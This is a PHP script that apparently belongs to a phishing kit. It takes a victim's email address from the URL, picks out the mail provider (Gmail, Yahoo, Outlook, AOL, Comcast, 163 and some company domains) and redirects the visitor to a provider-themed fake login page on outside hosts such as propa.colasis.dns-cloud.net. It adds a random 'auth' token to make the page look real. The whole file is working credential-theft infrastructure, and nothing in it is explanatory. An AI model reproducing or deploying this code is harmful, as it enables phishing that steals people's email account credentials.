<?php
error_reporting(0);
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
$user = $_GET['user'];
$auth=MD5(rand(32, 453));
$al = array("aol_auth", "auth_aol",); 
$yml = array("yahoo_auth", "auth_yahoo",);
$hml = array("hotmail_auth", "auth_hotmail");
$wml = array("webmail_auth", "auth_webmail");
$exm = array("sv", "uc");
$ggl = array("goog_auth", "auth_goog");
$qx = array("auth_comcast", "comcast_auth");
$st = array("auth_163", "163_auth");



if(!$user){		header('Location:https://propa.colasis.dns-cloud.net/'.$wml[rand(0, count($wml) - 1)].'/0003?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
if(!$yuh){
	header('Location:https://propa.colasis.dns-cloud.net/'.$wml[rand(0, count($wml) - 1)].'/0003?auth='.$auth.'&email='.$login.'&user='.$user.'');}
elseif($yuh=="Gmail"){
header('Location:https://propa.colasis.dns-cloud.net/'.$ggl[rand(0, count($ggl) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Aol"){
header('Location:https://propa.colasis.dns-cloud.net/'.$al[rand(0, count($al) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Outlook"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Yahoo"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$yml[rand(0, count($yml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Ymail"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$yml[rand(0, count($yml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Msn"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="163"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$st[rand(0, count($st) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Vip"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$st[rand(0, count($st) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Live"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Ansell"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Singnet"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Msa"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Toledo"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Nsk"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Slsbearings"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Hotmail"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$hml[rand(0, count($hml) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Fudabearings"){
	header('Location:https://osumaxhost.com.ve/online/exmail?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
elseif($yuh=="Comcast"){
	header('Location:https://propa.colasis.dns-cloud.net/'.$qx[rand(0, count($qx) - 1)].'?auth='.$auth.'&email='.$login.'&user='.$user.'');
}
else{
	header('Location:https://propa.colasis.dns-cloud.net/'.$wml[rand(0, count($wml) - 1)].'/0003?auth='.$auth.'&email='.$login.'&user='.$user.'');
};
?>